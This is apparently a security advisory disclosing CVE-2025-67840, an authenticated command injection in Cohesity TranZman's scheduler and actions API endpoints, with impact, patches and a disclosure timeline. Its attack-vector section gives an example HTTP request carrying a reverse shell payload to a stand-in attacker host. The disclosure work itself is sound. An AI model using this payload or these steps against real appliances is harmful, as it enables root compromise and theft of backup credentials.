# CVE-2025-67840: Web API Command Injection in Cohesity TranZman

## Overview

| Field | Value |
| --- | --- |
| CVE ID | CVE-2025-67840 |
| CVSS v3.1 | 7.2 (High) |
| Vector | AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H |
| CWE | CWE-78: OS Command Injection |
| Vendor | Cohesity, Inc. |
| Product | TranZman Migration Appliance |
| Affected Versions | Release 4.0 Build 14614 through TZM_1757588060_SEP2025_FULL.depot |

## Description

Multiple authenticated OS command injection vulnerabilities exist in the
Cohesity TranZman web application API endpoints. The appliance directly
concatenates user-controlled parameters into system commands without
sufficient sanitisation, allowing an authenticated admin user to inject
and execute arbitrary OS commands with root privileges.

The affected endpoints include:

- `/api/v1/scheduler/run` (Scheduler page)
- `/api/v1/actions/run` (Actions page)

An attacker can intercept legitimate requests during job creation or
execution using a proxy and modify parameters to include shell
metacharacters, achieving remote code execution on the appliance.
This completely bypasses the intended CLISH restricted shell confinement
and results in full system compromise.

## Attack Vector

1. Authenticated admin user logs into the TranZman web interface
2. Navigate to Scheduler page
3. Click "Run once" on an existing job (e.g., `/opt/SRLtzm/bin/backup`)
4. Intercept the request in a web proxy and modify the `job` parameter
5. Commands execute with root privileges on the appliance

Example - Modified HTTP request with reverse shell payload:

```http
POST /api/v1/scheduler/run HTTP/1.1
Host: <IP ADDRESS>
Content-Type: application/json
Authorization: Bearer <JWT_TOKEN>
X-Requested-With: XMLHttpRequest

{"job":"/bin/sh -i >& /dev/tcp/ATTACKER_IP/1337 0>&1"}
```

Server responds with `{"msg":"ok"}` and the reverse shell connects to the
attacker's listener.

No user interaction beyond normal admin workflow is required.

## Impact

- Remote Code Execution: Arbitrary commands execute as root
- Privilege Escalation: Bypasses CLISH restricted shell entirely
- Full System Compromise: Complete control of the TranZman appliance
- Data Exposure: Access to all backup metadata and credentials on the appliance

## Remediation

Apply Cohesity patches in the following order:

1. `TZM_patch_1.patch`
2. `TZM_1760106063_OCT2025R2_FULL.depot`

Contact Cohesity support for the latest OVA version with integrated fixes.

## Timeline

| Date | Event |
| --- | --- |
| 26 September 2025 | Reported to Cohesity |
| 20 October 2025 | Cohesity confirmed fix in patches |
| 25 December 2025 | Embargo period ended |
| 27 December 2025 | Public disclosure |

## Credit

Discovered by Greg Durys, LME

## References

- [MITRE CVE Record](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-67840)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
